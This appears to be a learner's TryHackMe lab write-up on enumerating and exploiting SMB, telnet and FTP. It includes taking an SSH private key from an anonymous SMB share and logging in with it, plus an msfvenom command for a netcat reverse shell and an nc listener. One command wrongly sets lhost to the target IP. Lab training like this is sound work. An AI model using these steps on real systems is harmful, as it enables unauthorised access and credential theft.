# TryHackMe Walkthrough: Network Services

📅 Date: 2025-02-04  
🔍 Difficulty Level: Easy 

🖥️ Category: Enumeration, Exploitation.  
🎯 Objective: Learn about, then enumerate and exploit a variety of network services and misconfigurations.

## 🛠1️⃣ **Enumerating SMB**
### 🔎 **Network Scanning**
**Command used:**
```bash
nmap -p- --open <target-IP>
```
**Findings:**
The scan revealed the following three open ports,
1. 22/tcp (ssh)
2. 139/tcp (netbios-ssn)
3. 445/tcp (microsoft-ds)
   
SMB is running on port 139 and 445.


Enum4linux is a tool used to enumerate SMB shares on both Windows and Linux systems.

**Command used** to conduct a full basic enumeration using Enum4linux:
```bash
enum4linux -a <target-IP>
```
**Findings:**

Workgroup name: WORKGROUP

![Screenshot (51)](https://github.com/user-attachments/assets/976f9812-a794-4eb3-bbf3-3a20f6dae28a)

Name of the machine: POLOSMB

Operating System version running: 6.1

![Screenshot (53)](https://github.com/user-attachments/assets/6a719092-08de-436e-9134-240333c522a4)

The share that sticks out as something we may want to investigate: profiles

![Screenshot (54)](https://github.com/user-attachments/assets/9c159062-a37f-43d7-b52e-7e48599a3dc2)

Why?
1. It is mapped successfully meaning that I have access to it.
2. It allows listing, which means that I can browse its contents.
3. Profiles usually store user data, which when misconfigured, can contain credentials or sensitive files.



## 📂2️⃣ **Exploiting SMB**

We're going to be exploiting anonymous SMB share access- a common misconfiguration that can allow us to gain information that will lead to a shell. 
We want to see if the profiles share does not require authentication to view the files.

**Command used:**
```bash
smbclient //<target-IP>/profiles -U Anonymous -p 445
```

**Findings:**

The share allows for anonymous access without providing a password. I also used the ls command to look for interesting documents that could contain valuable information.

![Screenshot (58)](https://github.com/user-attachments/assets/cd4f49c6-ca0b-4976-93ed-5355e41580a5)

The "Working From Home Information.txt" is the document that appeared interesting and took a look into it by using the command below:

```bash
smb: \> more "Working From Home Information.txt"
```

![Screenshot (57)](https://github.com/user-attachments/assets/d40f3292-be0d-407a-9d9d-42816e346d1d)

We can assume that this profile folder belongs to John Cactus. The ssh service has been configured to allow him to work from home meaning that the directory in the share that we should look into is .ssh.

The .ssh directory has a directory that contains authentication keys that allow a user to authenticate themselves on, and access a server. Of these keys, the one that is most useful to us is: id_rsa

I got to this directory by changing to the .ssh directory using the *cd .ssh* command then listed the contents in it using *ls*.

![Screenshot (60)](https://github.com/user-attachments/assets/b82501fd-d32c-48c6-ad30-963f2b34515e)

Now I will be using all the information I gathered to work out the username of the account. Then, use the service and key to log-in to the server.

Firstly, I had to download the id_rsa file into my local machine. I did that by using the command below:

```bash
smb: \> get .ssh/id_rsa id_rsa
```
I then used an exit command to return to my root directory.

I used the *ls* command to see if the id_rsa file had downloaded successfully in my local machine and indeed it had.

![Screenshot (61)](https://github.com/user-attachments/assets/100693d3-2a44-421d-af66-3c6630197d9c)

I then used the *ls -la* command to look list the files in the root directory and their permissions. 

![Screenshot (62)](https://github.com/user-attachments/assets/614e460f-f0e7-405d-bffd-c9c45c5e82e9)


I however changed the id_rsa permissions to 600 using:

```bash
chmod 600 id_rsa
```

This changes the file permissions to allow only the owner to read and write the file. 600 ensures secure SSH key usage, preventing other users from reading or modifying it.

After working out the username of the account, I entered the command below to direct me there. I then received a propt asking me if I was sure that I wanted to continue connection, said yes then I was in.

```bash
ssh -i id_rsa cactus@<target-IP> 
```

I then used the service and key to log in to the server.

![Screenshot (64)](https://github.com/user-attachments/assets/ddf28bd6-2a3b-40cc-9c64-d067e7b4a641)



## 🔌 3️⃣ **Enumerating Telnet** 

Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that is hosting a telent server. The lack of encyption, means that all telnet communication is in plaintext thus making it very vulnerable to exploits.

To enumerate, we will start out the same way we normally do, by doing a port scan, to find out as much information as we can about the services, applications, structure and operating system of the target machine.

**Command used:**

```bash
nmap -p- --open <target-IP> 
```

**Findings:**
1. There is one open port which is 8012/tcp.
2. Upon re-running the scan to look for all open ports exlusing " *-p-* ", I found that there's zero open ports. Here, we see that by assigning telnet to a non-standard port, it is not part of the common ports list, or top 1000 ports, that nmap scans.

Next, I looked for a clue of what the port could be used for as well as the possible usernames.

**Command used:**
```bash
nmap -sV -p 8012 <target-IP> 
```

**Findings:**

![Screenshot (67)](https://github.com/user-attachments/assets/eb2ab632-6618-484d-8236-cff23c7c7b06)


1. Based on the results and repeated title, I think the port could be used as a backdoor.
2. This backdoor could belong to Skidy.


## 🔓 4️⃣ Exploiting Telnet: Breaking into the Shell  

Using the information gathered from the enumeration stage, I will try accessing the telnet port, and using that as a foothold to get a full reverse shell on the machine. A reverse shell is a type of shell in which the target machine communicates back to the attacking machine.

Firstly, I connected to the telnet port.

**Command used:**
```bash
telnet <target-IP> 8012
```

**Findings:**

![Screenshot (68)](https://github.com/user-attachments/assets/06db79b7-09ef-474d-b84c-40b7eb7e9ec7) 


1. It was an open telnet connection, and received a welcome message: SKIDY'S BACKDOOR.
2. By trying to execute some commands, there was no return on any input entered into the telnet connection. Strange.

Now, I resort to checking to see if what I was typing was being executed as a system command by starting a tcpdump listener on my machine.


**Command used:**
```bash
sudo tcpdump ip proto \\icmp -i ens5
```

After startimg that tcpdump listener, on a separate terminal I used the command "**ping [local THM IP] -c 1**" through the tenet session to see if we're able to execute system commands, and as per the screenshot below, now we are able to execute system commands and reach our local machine.

![Screenshot (69)](https://github.com/user-attachments/assets/138d4513-8b76-48f5-aa5e-21254e17f707)

Now I am going to generate a reverse shell payload using **msvenom** . This will generate and encode a netcat reverse shell for us.

**Command used:**
```bash
msfvenom -p cmd/unix/reverse_netcat lhost=<target-IP> lport=4444 R
```

**Findings:**
1. The generated payload starts with mkfifo. We are nearly there...

![Screenshot (70)](https://github.com/user-attachments/assets/25dca7d9-438d-4cc2-b284-e4c5c5bf2cb0)

Now all we need to do is start a netcat listener on our local machine. We do this using the command below:

```bash
nc -lvnp 4444
```

## 📂 5️⃣ Enumerating FTP

Firstly, I will run an nmap scan to check for open ports.

**Command used:**

```bash
nmap -p- --open <target-IP> 
```

**Findings:**
1. There is only one open port - port 21/tcp running ftp.

![Screenshot (78)](https://github.com/user-attachments/assets/90db0efd-677e-4e60-876e-840c6cd63efc)


Next, I looked to see which variant of FTP is running on this open port.

**Command used:**

```bash
nmap -sV -p 21 <target-IP> 
```

**Findings:**

1. I found this variant to be vsftpd.

![Screenshot (79)](https://github.com/user-attachments/assets/b7380c4d-6036-45af-8efc-148240d9a851)


Now, I am going to check if I can login anonymously to the FTP server and without providing a password.

**Command used:**

```bash
ftp <target-IP> 
```

The above command prompted for a username of which I gave as "anonymous". It then prompted for a password that I did not enter and viola, I was in!

**Findings:**

![Screenshot (80)](https://github.com/user-attachments/assets/9eeb6363-8e5f-4032-88a0-eba781754e69)

1. In the anonymous FTP directory, I found a file called PUBLIC_NOTICE.txt.
2. I also found a pissible username: Mike.

![Screenshot (84)](https://github.com/user-attachments/assets/ba2caa60-7886-4117-b088-6e817eddd3da)

![Screenshot (83)](https://github.com/user-attachments/assets/52ca7dfa-9430-4655-9864-5d9f76617023)









